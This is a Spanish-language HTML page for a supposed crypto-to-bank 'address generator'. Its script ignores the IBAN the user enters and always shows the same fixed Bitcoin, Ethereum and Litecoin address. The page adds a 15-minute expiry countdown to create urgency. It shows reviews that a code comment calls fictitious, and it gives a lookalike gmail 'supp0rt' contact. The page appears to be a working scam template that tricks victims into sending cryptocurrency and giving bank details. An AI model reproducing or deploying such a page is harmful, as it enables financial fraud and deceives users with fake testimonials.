<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CryptoBank - Plataforma de generación de direcciones cripto</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f9fafb;
            color: #333;
            margin: 0;
            padding: 0;
        }

        header {
            background-color: #0284c7;
            color: white;
            padding: 20px;
            text-align:;
        }

        h1 {
            margin: 0;
            font-size: 2.5rem;
        }

        h2 {
            color: #0284c7;
            font-size: 1.5rem;
            text-align: center;
            margin-bottom: 1.5rem;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        .card {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
        }

        .card input,
        .card select {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        .card button {
            padding: 10px 20px;
            background-color: #0284c7;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        .card button:hover {
            background-color: #0277bd;
        }

        .address-box {
            margin: 10px 0;
            background-color: #f1f5f9;
            padding: 10px;
            border-radius: 5px;
            display: flex;
            align-items: center;
        }

        .address-box span {
            flex: 1;
        }

        .copy-btn {
            background-color: #10b981;
            padding: 5px 10px;
            color: white;
            border-radius: 5px;
            cursor: pointer;
        }

        .copy-btn:hover {
            background-color: #059669;
        }

        .footer {
            background-color: #0284c7;
            color: white;
            padding: 20px;
            text-align: center;
            font-size: 0.875rem;
        }

        .footer a {
            color: white;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        .reviews {
            background-color: #e0f2fe;
            padding: 20px 0;
        }

        .review-card {
            background-color: #ffffff;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.05);
            margin-bottom: 1.5rem;
            display: flex;
            flex-direction: column;
            align-items: flex-start;
        }

        .review-card .user-icon {
            font-size: 1.25rem;
        }

        .review-card .stars {
            color: #fbbf24;
        }

        .review-card p {
            color: #334155;
        }

        /* Message d'erreur et succès */
        .message-box {
            padding: 15px;
            margin-top: 10px;
            border-radius: 5px;
            color: white;
            display: none;
        }

        .error {
            background-color: #f44336;
        }

        .success {
            background-color: #4caf50;
        }

        .message-box p {
            margin: 0;
        }
#generatedAddress {
    word-break: break-all;
    font-family: monospace;
    background: #f4f4f4;
    padding: 10px;
    border-radius: 8px;
    max-width: 100%;
    overflow-wrap: break-word;
    text-align: left;
    white-space: pre-wrap;
}

#addressBox {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 10px;
    flex-wrap: wrap;
    max-width: 100%;
}
.main-title {
    font-size: 1rem;
    margin: 0;
}

.intro {
    background-color: #e0f2fe;
    padding: 20px;
    text-align: center;
}

.sub-title {
    font-size: 1.10rem;
    color: #0284c7;
    margin-bottom: 0.5rem;
}

.tagline {
    font-size: 1rem;
    color: #334155;
}
    </style>
</head>

<body>
    <header>
      <h1 class="main-title">Bank-Cryptoconvertor</h1>
    </header>
<section class="intro">
    <h2 class="sub-title">Generador de direcciones cripto</h2>
    <p class="tagline">Esta plataforma le permite transferir criptomonedas directamente a su cuenta bancaria.
</p>
</section>

    <div class="container">
        <section class="card">
<div style="text-align:center;">
<img style="width:70%" src="image/title.png"> </div>
            <h2>Generar una dirección cripto</h2> 
            <label for="accountNumber">Número de cuenta / IBAN</label>
            <input type="text" id="accountNumber" placeholder="Introduce un número de cuenta o IBAN" />
            <label for="cryptoType">Tipo de cripto</label>
            <select id="cryptoType">
                <option value="bitcoin">Bitcoin (BTC)</option>
                <option value="ethereum">Ethereum (ETH)</option>
                <option value="litecoin">Litecoin (LTC)</option>
            </select>
            <button onclick="generateAddress()">Generar dirección</button>

            <!-- Messages -->
            <div id="messageBox" class="message-box"></div>

            <div class="address-box" id="addressBox" style="display:none;">
                <span id="generatedAddress">Dirección cripto generada aquí</span>
                <button class="copy-btn" onclick="copyAddress()">Copiar</button>
            </div>

            <p id="countdownTimer" style="font-weight: bold; color: red; display:none;">La dirección expirará en: <span id="timer"></span></p>
        </section>

        <section class="reviews">
            <div class="container">
                <h2>Opiniones de los usuarios</h2>
                <div id="reviewsContainer"></div>
            </div>
        </section>
    </div>

    <footer class="footer">
        <p>&copy; 2025 CryptoBank. Todos los derechos reservados. | <a href="#">Política de privacidad</a> | <a href="mailto:contact.supp0rt.de@gmail.com">Contáctanos</a></p>
    </footer>

   <script>
    // Liste d'avis fictifs
   const reviews = [
        { name: "Alice Dupont", text: "¡Servicio rápido y eficaz! Estoy impresionada.", stars: 5 },
 
{ name: "Lise Dufresne", text: "A veces el temporizador se bloquea, pero en general bien.", stars: 4 },
    
        { name: "Bob Martin", text: "Interfaz agradable y fácil de usar.", stars: 5 },
        { name: "Claire Lefevre", text: "La dirección se genera instantáneamente, ¡perfecto!", stars: 5 },
        { name: "David Lemoine", text: "Me encanta la claridad de este sitio.", stars: 4 },
        { name: "Eva Rousseau", text: "Muy buena herramienta para pruebas de cripto.", stars: 4 },
        { name: "Félix Bernard", text: "El sistema de expiración es muy práctico.", stars: 5 },
        { name: "Gérard Moreau", text: "Recomiendo mucho esta plataforma.", stars: 5 },
        { name: "Hélène Fauconnier", text: "Fácil de entender incluso para principiantes.", stars: 4 },
        { name: "Isabelle Leroy", text: "Muy útil para demostraciones a clientes.", stars: 5 },
        { name: "Julien Lefevre", text: "Rápido, limpio y confiable.", stars: 5 },
        { name: "Kévin Girard", text: "Tuve un pequeño bug de visualización, pero por lo demás está bien.", stars: 3 }
];
       

    const reviewsContainer = document.getElementById('reviewsContainer');
    reviews.forEach(review => {
        const div = document.createElement('div');
        div.className = 'review-card';
        const stars = '★'.repeat(review.stars) + '☆'.repeat(5 - review.stars);
        div.innerHTML = `
            <div style="display: flex; align-items: center; gap: 0.5rem;">
                <span class="user-icon">👤</span>
                <strong>${review.name}</strong>
            </div>
            <div class="stars">${stars}</div>
            <p>“${review.text}”</p>
        `;
        reviewsContainer.appendChild(div);
    });

    // Adresses fixes par crypto
    const addresses = {
        bitcoin: "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
        ethereum: "0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe",
        litecoin: "LcHKXxkHnCbczJg6PE1mCjya5y87uVWR3Z"
    };

    // Générer l'adresse
    function generateAddress() {
        const accountNumber = document.getElementById('accountNumber').value;
        const cryptoType = document.getElementById('cryptoType').value;

        if (!accountNumber.trim()) {
            showMessage("Por favor, ingresa un número de cuenta o IBAN.", "error");
            return;
        }

        const address = addresses[cryptoType];
        document.getElementById('generatedAddress').textContent = address;
        document.getElementById('addressBox').style.display = 'flex';

        startCountdown();
        showMessage("Dirección generada con éxito.", "success");
    }

    // Copier l'adresse
    function copyAddress() {
        const addressText = document.getElementById('generatedAddress').textContent;
        navigator.clipboard.writeText(addressText);
        showMessage("Dirección copiada al portapapeles.", "success");
    }

    // Affichage de messages
    function showMessage(message, type) {
        const messageBox = document.getElementById('messageBox');
        messageBox.style.display = 'block';
        messageBox.className = `message-box ${type}`;
        messageBox.innerHTML = `<p>${message}</p>`;
        setTimeout(() => {
            messageBox.style.display = 'none';
        }, 3000);
    }

    // Minuterie de 15 minutes
    let countdown;
    function startCountdown() {
        clearInterval(countdown);
        let timeLeft = 15 * 60;

        function updateTimer() {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            document.getElementById('timer').textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
            if (timeLeft === 0) {
                showMessage("La dirección ha expirado.", "error");
                clearInterval(countdown);
            } else {
                timeLeft--;
            }
        }

        updateTimer();
        countdown = setInterval(updateTimer, 1000);
        document.getElementById('countdownTimer').style.display = 'block';
    }
</script>
</body>

</html>